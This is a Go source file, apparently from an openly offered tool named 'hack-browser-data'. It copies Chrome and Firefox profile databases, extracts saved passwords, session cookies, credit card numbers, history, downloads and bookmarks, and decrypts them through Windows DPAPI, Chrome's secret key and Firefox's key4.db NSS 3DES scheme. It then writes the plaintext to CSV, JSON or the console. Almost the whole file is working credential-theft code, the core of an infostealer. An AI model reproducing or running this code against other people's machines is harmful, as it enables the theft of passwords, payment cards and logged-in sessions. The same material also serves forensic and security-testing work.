package data

import (
	"bytes"
	"database/sql"
	"encoding/base64"
	"io/ioutil"
	"os"
	"path/filepath"
	"sort"
	"time"

	"hack-browser-data/core/decrypt"
	"hack-browser-data/log"
	"hack-browser-data/utils"

	_ "github.com/mattn/go-sqlite3"
	"github.com/tidwall/gjson"
)

type Item interface {
	// ChromeParse parse chrome items, Password and Cookie need secret key
	ChromeParse(key []byte) error

	// FirefoxParse parse firefox items
	FirefoxParse() error

	// OutPut file name and format type
	OutPut(format, browser, dir string) error

	// CopyDB is copy item db file to current dir
	CopyDB() error

	// Release is delete item db file
	Release() error
}

const (
	ChromeCreditFile   = "Web Data"
	ChromePasswordFile = "Login Data"
	ChromeHistoryFile  = "History"
	ChromeDownloadFile = "History"
	ChromeCookieFile   = "Cookies"
	ChromeBookmarkFile = "Bookmarks"
	FirefoxCookieFile  = "cookies.sqlite"
	FirefoxKey4File    = "key4.db"
	FirefoxLoginFile   = "logins.json"
	FirefoxDataFile    = "places.sqlite"
)

var (
	queryChromiumCredit   = `SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards`
	queryChromiumLogin    = `SELECT origin_url, username_value, password_value, date_created FROM logins`
	queryChromiumHistory  = `SELECT url, title, visit_count, last_visit_time FROM urls`
	queryChromiumDownload = `SELECT target_path, tab_url, total_bytes, start_time, end_time, mime_type FROM downloads`
	queryChromiumCookie   = `SELECT name, encrypted_value, host_key, path, creation_utc, expires_utc, is_secure, is_httponly, has_expires, is_persistent FROM cookies`
	queryFirefoxHistory   = `SELECT id, url, last_visit_date, title, visit_count FROM moz_places`
	queryFirefoxBookMarks = `SELECT id, fk, type, dateAdded, title FROM moz_bookmarks`
	queryFirefoxCookie    = `SELECT name, value, host, path, creationTime, expiry, isSecure, isHttpOnly FROM moz_cookies`
	queryMetaData         = `SELECT item1, item2 FROM metaData WHERE id = 'password'`
	queryNssPrivate       = `SELECT a11, a102 from nssPrivate`
	closeJournalMode      = `PRAGMA journal_mode=off`
)

const (
	bookmarkID       = "id"
	bookmarkAdded    = "date_added"
	bookmarkUrl      = "url"
	bookmarkName     = "name"
	bookmarkType     = "type"
	bookmarkChildren = "children"
)

type bookmarks struct {
	mainPath  string
	bookmarks []bookmark
}

func NewBookmarks(main, sub string) Item {
	return &bookmarks{mainPath: main}
}

func (b *bookmarks) ChromeParse(key []byte) error {
	bookmarks, err := utils.ReadFile(ChromeBookmarkFile)
	if err != nil {
		return err
	}
	r := gjson.Parse(bookmarks)
	if r.Exists() {
		roots := r.Get("roots")
		roots.ForEach(func(key, value gjson.Result) bool {
			getBookmarkChildren(value, b)
			return true
		})
	}
	return nil
}

func getBookmarkChildren(value gjson.Result, b *bookmarks) (children gjson.Result) {
	nodeType := value.Get(bookmarkType)
	bm := bookmark{
		ID:        value.Get(bookmarkID).Int(),
		Name:      value.Get(bookmarkName).String(),
		URL:       value.Get(bookmarkUrl).String(),
		DateAdded: utils.TimeEpochFormat(value.Get(bookmarkAdded).Int()),
	}
	children = value.Get(bookmarkChildren)
	if nodeType.Exists() {
		bm.Type = nodeType.String()
		b.bookmarks = append(b.bookmarks, bm)
		if children.Exists() && children.IsArray() {
			for _, v := range children.Array() {
				children = getBookmarkChildren(v, b)
			}
		}
	}
	return children
}

func (b *bookmarks) FirefoxParse() error {
	var (
		err          error
		keyDB        *sql.DB
		bookmarkRows *sql.Rows
		tempMap      map[int64]string
		bookmarkUrl  string
	)
	keyDB, err = sql.Open("sqlite3", FirefoxDataFile)
	if err != nil {
		return err
	}
	defer func() {
		if err := keyDB.Close(); err != nil {
			log.Error(err)
		}
	}()
	_, err = keyDB.Exec(closeJournalMode)
	if err != nil {
		log.Error(err)
	}
	bookmarkRows, err = keyDB.Query(queryFirefoxBookMarks)
	if err != nil {
		return err
	}
	for bookmarkRows.Next() {
		var (
			id, fk, bType, dateAdded int64
			title                    string
		)
		err = bookmarkRows.Scan(&id, &fk, &bType, &dateAdded, &title)
		if err != nil {
			log.Warn(err)
		}
		if url, ok := tempMap[id]; ok {
			bookmarkUrl = url
		}
		b.bookmarks = append(b.bookmarks, bookmark{
			ID:        id,
			Name:      title,
			Type:      utils.BookMarkType(bType),
			URL:       bookmarkUrl,
			DateAdded: utils.TimeStampFormat(dateAdded / 1000000),
		})
	}
	return nil
}

func (b *bookmarks) CopyDB() error {
	return copyToLocalPath(b.mainPath, filepath.Base(b.mainPath))
}

func (b *bookmarks) Release() error {
	return os.Remove(filepath.Base(b.mainPath))
}

func (b *bookmarks) OutPut(format, browser, dir string) error {
	sort.Slice(b.bookmarks, func(i, j int) bool {
		return b.bookmarks[i].ID < b.bookmarks[j].ID
	})
	switch format {
	case "csv":
		err := b.outPutCsv(browser, dir)
		return err
	case "console":
		b.outPutConsole()
		return nil
	default:
		err := b.outPutJson(browser, dir)
		return err
	}
}

type cookies struct {
	mainPath string
	cookies  map[string][]cookie
}

func NewCookies(main, sub string) Item {
	return &cookies{mainPath: main}
}

func (c *cookies) ChromeParse(secretKey []byte) error {
	c.cookies = make(map[string][]cookie)
	cookieDB, err := sql.Open("sqlite3", ChromeCookieFile)
	if err != nil {
		return err
	}
	defer func() {
		if err := cookieDB.Close(); err != nil {
			log.Debug(err)
		}
	}()
	rows, err := cookieDB.Query(queryChromiumCookie)
	if err != nil {
		return err
	}
	defer func() {
		if err := rows.Close(); err != nil {
			log.Debug(err)
		}
	}()
	for rows.Next() {
		var (
			key, host, path                               string
			isSecure, isHTTPOnly, hasExpire, isPersistent int
			createDate, expireDate                        int64
			value, encryptValue                           []byte
		)
		err = rows.Scan(&key, &encryptValue, &host, &path, &createDate, &expireDate, &isSecure, &isHTTPOnly, &hasExpire, &isPersistent)
		if err != nil {
			log.Error(err)
		}
		cookie := cookie{
			KeyName:      key,
			Host:         host,
			Path:         path,
			encryptValue: encryptValue,
			IsSecure:     utils.IntToBool(isSecure),
			IsHTTPOnly:   utils.IntToBool(isHTTPOnly),
			HasExpire:    utils.IntToBool(hasExpire),
			IsPersistent: utils.IntToBool(isPersistent),
			CreateDate:   utils.TimeEpochFormat(createDate),
			ExpireDate:   utils.TimeEpochFormat(expireDate),
		}
		// remove 'v10'
		if secretKey == nil {
			value, err = decrypt.DPApi(encryptValue)
		} else {
			value, err = decrypt.ChromePass(secretKey, encryptValue)
		}
		if err != nil {
			log.Debug(err)
		}
		cookie.Value = string(value)
		c.cookies[host] = append(c.cookies[host], cookie)
	}
	return nil
}

func (c *cookies) FirefoxParse() error {
	c.cookies = make(map[string][]cookie)
	cookieDB, err := sql.Open("sqlite3", FirefoxCookieFile)
	if err != nil {
		return err
	}
	defer func() {
		if err := cookieDB.Close(); err != nil {
			log.Debug(err)
		}
	}()
	rows, err := cookieDB.Query(queryFirefoxCookie)
	if err != nil {
		return err
	}
	defer func() {
		if err := rows.Close(); err != nil {
			log.Debug(err)
		}
	}()
	for rows.Next() {
		var (
			name, value, host, path string
			isSecure, isHttpOnly    int
			creationTime, expiry    int64
		)
		err = rows.Scan(&name, &value, &host, &path, &creationTime, &expiry, &isSecure, &isHttpOnly)
		if err != nil {
			log.Error(err)
		}
		c.cookies[host] = append(c.cookies[host], cookie{
			KeyName:    name,
			Host:       host,
			Path:       path,
			IsSecure:   utils.IntToBool(isSecure),
			IsHTTPOnly: utils.IntToBool(isHttpOnly),
			CreateDate: utils.TimeStampFormat(creationTime / 1000000),
			ExpireDate: utils.TimeStampFormat(expiry),
			Value:      value,
		})
	}
	return nil
}

func (c *cookies) CopyDB() error {
	return copyToLocalPath(c.mainPath, filepath.Base(c.mainPath))
}

func (c *cookies) Release() error {
	return os.Remove(filepath.Base(c.mainPath))
}

func (c *cookies) OutPut(format, browser, dir string) error {
	switch format {
	case "csv":
		err := c.outPutCsv(browser, dir)
		return err
	case "console":
		c.outPutConsole()
		return nil
	default:
		err := c.outPutJson(browser, dir)
		return err
	}
}

type historyData struct {
	mainPath string
	history  []history
}

func NewHistoryData(main, sub string) Item {
	return &historyData{mainPath: main}
}

func (h *historyData) ChromeParse(key []byte) error {
	historyDB, err := sql.Open("sqlite3", ChromeHistoryFile)
	if err != nil {
		return err
	}
	defer func() {
		if err := historyDB.Close(); err != nil {
			log.Error(err)
		}
	}()
	rows, err := historyDB.Query(queryChromiumHistory)
	if err != nil {
		return err
	}
	defer func() {
		if err := rows.Close(); err != nil {
			log.Debug(err)
		}
	}()
	for rows.Next() {
		var (
			url, title    string
			visitCount    int
			lastVisitTime int64
		)
		err := rows.Scan(&url, &title, &visitCount, &lastVisitTime)
		data := history{
			Url:           url,
			Title:         title,
			VisitCount:    visitCount,
			LastVisitTime: utils.TimeEpochFormat(lastVisitTime),
		}
		if err != nil {
			log.Error(err)
		}
		h.history = append(h.history, data)
	}
	return nil
}

func (h *historyData) FirefoxParse() error {
	var (
		err         error
		keyDB       *sql.DB
		historyRows *sql.Rows
		tempMap     map[int64]string
	)
	tempMap = make(map[int64]string)
	keyDB, err = sql.Open("sqlite3", FirefoxDataFile)
	if err != nil {
		return err
	}
	_, err = keyDB.Exec(closeJournalMode)
	if err != nil {
		log.Error(err)
	}
	defer func() {
		if err := keyDB.Close(); err != nil {
			log.Error(err)
		}
	}()
	historyRows, err = keyDB.Query(queryFirefoxHistory)
	if err != nil {
		log.Error(err)
		return err
	}
	defer func() {
		if err := historyRows.Close(); err != nil {
			log.Error(err)
		}
	}()
	for historyRows.Next() {
		var (
			id, visitDate int64
			url, title    string
			visitCount    int
		)
		err = historyRows.Scan(&id, &url, &visitDate, &title, &visitCount)
		if err != nil {
			log.Warn(err)
		}
		h.history = append(h.history, history{
			Title:         title,
			Url:           url,
			VisitCount:    visitCount,
			LastVisitTime: utils.TimeStampFormat(visitDate / 1000000),
		})
		tempMap[id] = url
	}
	return nil
}

func (h *historyData) CopyDB() error {
	return copyToLocalPath(h.mainPath, filepath.Base(h.mainPath))
}

func (h *historyData) Release() error {
	return os.Remove(filepath.Base(h.mainPath))
}

func (h *historyData) OutPut(format, browser, dir string) error {
	sort.Slice(h.history, func(i, j int) bool {
		return h.history[i].VisitCount > h.history[j].VisitCount
	})
	switch format {
	case "csv":
		err := h.outPutCsv(browser, dir)
		return err
	case "console":
		h.outPutConsole()
		return nil
	default:
		err := h.outPutJson(browser, dir)
		return err
	}
}

type downloads struct {
	mainPath  string
	downloads []download
}

func NewDownloads(main, sub string) Item {
	return &downloads{mainPath: main}
}

func (d *downloads) ChromeParse(key []byte) error {
	historyDB, err := sql.Open("sqlite3", ChromeDownloadFile)
	if err != nil {
		return err
	}
	defer func() {
		if err := historyDB.Close(); err != nil {
			log.Error(err)
		}
	}()
	rows, err := historyDB.Query(queryChromiumDownload)
	if err != nil {
		return err
	}
	defer func() {
		if err := rows.Close(); err != nil {
			log.Error(err)
		}
	}()
	for rows.Next() {
		var (
			targetPath, tabUrl, mimeType   string
			totalBytes, startTime, endTime int64
		)
		err := rows.Scan(&targetPath, &tabUrl, &totalBytes, &startTime, &endTime, &mimeType)
		data := download{
			TargetPath: targetPath,
			Url:        tabUrl,
			TotalBytes: totalBytes,
			StartTime:  utils.TimeEpochFormat(startTime),
			EndTime:    utils.TimeEpochFormat(endTime),
			MimiType:   mimeType,
		}
		if err != nil {
			log.Error(err)
		}
		d.downloads = append(d.downloads, data)
	}
	return nil
}

func (d *downloads) FirefoxParse() error {
	return nil
}

func (d *downloads) CopyDB() error {
	return copyToLocalPath(d.mainPath, filepath.Base(d.mainPath))
}

func (d *downloads) Release() error {
	return os.Remove(filepath.Base(d.mainPath))
}

func (d *downloads) OutPut(format, browser, dir string) error {
	switch format {
	case "csv":
		err := d.outPutCsv(browser, dir)
		return err
	case "console":
		d.outPutConsole()
		return nil
	default:
		err := d.outPutJson(browser, dir)
		return err
	}
}

type passwords struct {
	mainPath string
	subPath  string
	logins   []loginData
}

func NewFPasswords(main, sub string) Item {
	return &passwords{mainPath: main, subPath: sub}
}

func NewCPasswords(main, sub string) Item {
	return &passwords{mainPath: main}
}

func (p *passwords) ChromeParse(key []byte) error {
	loginDB, err := sql.Open("sqlite3", ChromePasswordFile)
	if err != nil {
		return err
	}
	defer func() {
		if err := loginDB.Close(); err != nil {
			log.Debug(err)
		}
	}()
	rows, err := loginDB.Query(queryChromiumLogin)
	if err != nil {
		return err
	}
	defer func() {
		if err := rows.Close(); err != nil {
			log.Debug(err)
		}
	}()
	for rows.Next() {
		var (
			url, username string
			pwd, password []byte
			create        int64
		)
		err = rows.Scan(&url, &username, &pwd, &create)
		if err != nil {
			log.Error(err)
		}
		login := loginData{
			UserName:    username,
			encryptPass: pwd,
			LoginUrl:    url,
		}
		if key == nil {
			password, err = decrypt.DPApi(pwd)
		} else {
			password, err = decrypt.ChromePass(key, pwd)
		}
		if err != nil {
			log.Debugf("%s have empty password %s", login.LoginUrl, err.Error())
		}
		if create > time.Now().Unix() {
			login.CreateDate = utils.TimeEpochFormat(create)
		} else {
			login.CreateDate = utils.TimeStampFormat(create)
		}
		login.Password = string(password)
		p.logins = append(p.logins, login)
	}
	return nil
}

func (p *passwords) FirefoxParse() error {
	globalSalt, metaBytes, nssA11, nssA102, err := getFirefoxDecryptKey()
	if err != nil {
		return err
	}
	keyLin := []byte{248, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1}
	meta, err := decrypt.DecodeMeta(metaBytes)
	if err != nil {
		log.Error("decrypt meta data failed", err)
		return err
	}
	var masterPwd []byte
	m, err := decrypt.Meta(globalSalt, masterPwd, meta)
	if err != nil {
		log.Error("decrypt firefox meta failed", err)
		return err
	}
	if bytes.Contains(m, []byte("password-check")) {
		log.Debug("password-check success")
		m := bytes.Compare(nssA102, keyLin)
		if m == 0 {
			nss, err := decrypt.DecodeNss(nssA11)
			if err != nil {
				log.Error("decode firefox nssA11 bytes failed", err)
				return err
			}
			finallyKey, err := decrypt.Nss(globalSalt, masterPwd, nss)
			finallyKey = finallyKey[:24]
			if err != nil {
				log.Error("get firefox finally key failed")
				return err
			}
			allLogins, err := getFirefoxLoginData()
			if err != nil {
				return err
			}
			for _, v := range allLogins {
				userPBE, _ := decrypt.DecodeLogin(v.encryptUser)
				pwdPBE, _ := decrypt.DecodeLogin(v.encryptPass)
				user, err := decrypt.Des3Decrypt(finallyKey, userPBE.Iv, userPBE.Encrypted)
				if err != nil {
					log.Error(err)
				}
				pwd, err := decrypt.Des3Decrypt(finallyKey, pwdPBE.Iv, pwdPBE.Encrypted)
				if err != nil {
					log.Error(err)
				}
				log.Debug("decrypt firefox success")
				p.logins = append(p.logins, loginData{
					LoginUrl:   v.LoginUrl,
					UserName:   string(decrypt.PKCS5UnPadding(user)),
					Password:   string(decrypt.PKCS5UnPadding(pwd)),
					CreateDate: v.CreateDate,
				})
			}
		}
	}
	return nil
}

func (p *passwords) CopyDB() error {
	err := copyToLocalPath(p.mainPath, filepath.Base(p.mainPath))
	if err != nil {
		log.Error(err)
	}
	if p.subPath != "" {
		err = copyToLocalPath(p.subPath, filepath.Base(p.subPath))
	}
	return err
}

func (p *passwords) Release() error {
	err := os.Remove(filepath.Base(p.mainPath))
	if err != nil {
		log.Error(err)
	}
	if p.subPath != "" {
		err = os.Remove(filepath.Base(p.subPath))
	}
	return err
}

func (p *passwords) OutPut(format, browser, dir string) error {
	sort.Sort(p)
	switch format {
	case "csv":
		err := p.outPutCsv(browser, dir)
		return err
	case "console":
		p.outPutConsole()
		return nil
	default:
		err := p.outPutJson(browser, dir)
		return err
	}
}

type creditCards struct {
	mainPath string
	cards    map[string][]card
}

func NewCCards(main string, sub string) Item {
	return &creditCards{mainPath: main}
}

func (c *creditCards) FirefoxParse() error {
	return nil // FireFox does not have a credit card saving feature
}

func (c *creditCards) ChromeParse(secretKey []byte) error {
	c.cards = make(map[string][]card)
	creditDB, err := sql.Open("sqlite3", ChromeCreditFile)
	if err != nil {
		return err
	}
	defer func() {
		if err := creditDB.Close(); err != nil {
			log.Debug(err)
		}
	}()
	rows, err := creditDB.Query(queryChromiumCredit)
	if err != nil {
		return err
	}
	defer func() {
		if err := rows.Close(); err != nil {
			log.Debug(err)
		}
	}()
	for rows.Next() {
		var (
			name, month, year, guid string
			value, encryptValue     []byte
		)
		err := rows.Scan(&guid, &name, &month, &year, &encryptValue)
		if err != nil {
			log.Error(err)
		}
		creditCardInfo := card{
			GUID:            guid,
			Name:            name,
			ExpirationMonth: month,
			ExpirationYear:  year,
		}
		if secretKey == nil {
			value, err = decrypt.DPApi(encryptValue)
		} else {
			value, err = decrypt.ChromePass(secretKey, encryptValue)
		}
		if err != nil {
			log.Debug(err)
		}
		creditCardInfo.CardNumber = string(value)
		c.cards[guid] = append(c.cards[guid], creditCardInfo)
	}
	return nil
}

func (c *creditCards) CopyDB() error {
	return copyToLocalPath(c.mainPath, filepath.Base(c.mainPath))
}

func (c *creditCards) Release() error {
	return os.Remove(filepath.Base(c.mainPath))
}

func (c *creditCards) OutPut(format, browser, dir string) error {
	switch format {
	case "csv":
		err := c.outPutCsv(browser, dir)
		return err
	case "console":
		c.outPutConsole()
		return nil
	default:
		err := c.outPutJson(browser, dir)
		return err
	}
}

// getFirefoxDecryptKey get value from key4.db
func getFirefoxDecryptKey() (item1, item2, a11, a102 []byte, err error) {
	var (
		keyDB   *sql.DB
		pwdRows *sql.Rows
		nssRows *sql.Rows
	)
	keyDB, err = sql.Open("sqlite3", FirefoxKey4File)
	if err != nil {
		log.Error(err)
		return nil, nil, nil, nil, err
	}
	defer func() {
		if err := keyDB.Close(); err != nil {
			log.Error(err)
		}
	}()

	pwdRows, err = keyDB.Query(queryMetaData)
	defer func() {
		if err := pwdRows.Close(); err != nil {
			log.Debug(err)
		}
	}()
	for pwdRows.Next() {
		if err := pwdRows.Scan(&item1, &item2); err != nil {
			log.Error(err)
			continue
		}
	}
	if err != nil {
		log.Error(err)
	}
	nssRows, err = keyDB.Query(queryNssPrivate)
	defer func() {
		if err := nssRows.Close(); err != nil {
			log.Debug(err)
		}
	}()
	for nssRows.Next() {
		if err := nssRows.Scan(&a11, &a102); err != nil {
			log.Debug(err)
		}
	}
	return item1, item2, a11, a102, nil
}

// getFirefoxLoginData use to get firefox
func getFirefoxLoginData() (l []loginData, err error) {
	s, err := ioutil.ReadFile(FirefoxLoginFile)
	if err != nil {
		return nil, err
	}
	h := gjson.GetBytes(s, "logins")
	if h.Exists() {
		for _, v := range h.Array() {
			var (
				m loginData
				u []byte
				p []byte
			)
			m.LoginUrl = v.Get("formSubmitURL").String()
			u, err = base64.StdEncoding.DecodeString(v.Get("encryptedUsername").String())
			m.encryptUser = u
			if err != nil {
				log.Debug(err)
			}
			p, err = base64.StdEncoding.DecodeString(v.Get("encryptedPassword").String())
			m.encryptPass = p
			m.CreateDate = utils.TimeStampFormat(v.Get("timeCreated").Int() / 1000)
			l = append(l, m)
		}
	}
	return
}

type (
	loginData struct {
		UserName    string
		encryptPass []byte
		encryptUser []byte
		Password    string
		LoginUrl    string
		CreateDate  time.Time
	}
	bookmark struct {
		ID        int64
		Name      string
		Type      string
		URL       string
		DateAdded time.Time
	}
	cookie struct {
		Host         string
		Path         string
		KeyName      string
		encryptValue []byte
		Value        string
		IsSecure     bool
		IsHTTPOnly   bool
		HasExpire    bool
		IsPersistent bool
		CreateDate   time.Time
		ExpireDate   time.Time
	}
	history struct {
		Title         string
		Url           string
		VisitCount    int
		LastVisitTime time.Time
	}
	download struct {
		TargetPath string
		Url        string
		TotalBytes int64
		StartTime  time.Time
		EndTime    time.Time
		MimiType   string
	}
	card struct {
		GUID            string
		Name            string
		ExpirationYear  string
		ExpirationMonth string
		CardNumber      string
	}
)

func (p passwords) Len() int {
	return len(p.logins)
}

func (p passwords) Less(i, j int) bool {
	return p.logins[i].CreateDate.After(p.logins[j].CreateDate)
}

func (p passwords) Swap(i, j int) {
	p.logins[i], p.logins[j] = p.logins[j], p.logins[i]
}

func (d downloads) Len() int {
	return len(d.downloads)
}

func (d downloads) Less(i, j int) bool {
	return d.downloads[i].StartTime.After(d.downloads[j].StartTime)
}

func (d downloads) Swap(i, j int) {
	d.downloads[i], d.downloads[j] = d.downloads[j], d.downloads[i]
}

func copyToLocalPath(src, dst string) error {
	locals, _ := filepath.Glob("*")
	for _, v := range locals {
		if v == dst {
			err := os.Remove(dst)
			if err != nil {
				return err
			}
		}
	}
	sourceFile, err := ioutil.ReadFile(src)
	if err != nil {
		log.Debug(err.Error())
	}
	err = ioutil.WriteFile(dst, sourceFile, 0777)
	if err != nil {
		log.Debug(err.Error())
	}
	return err
}
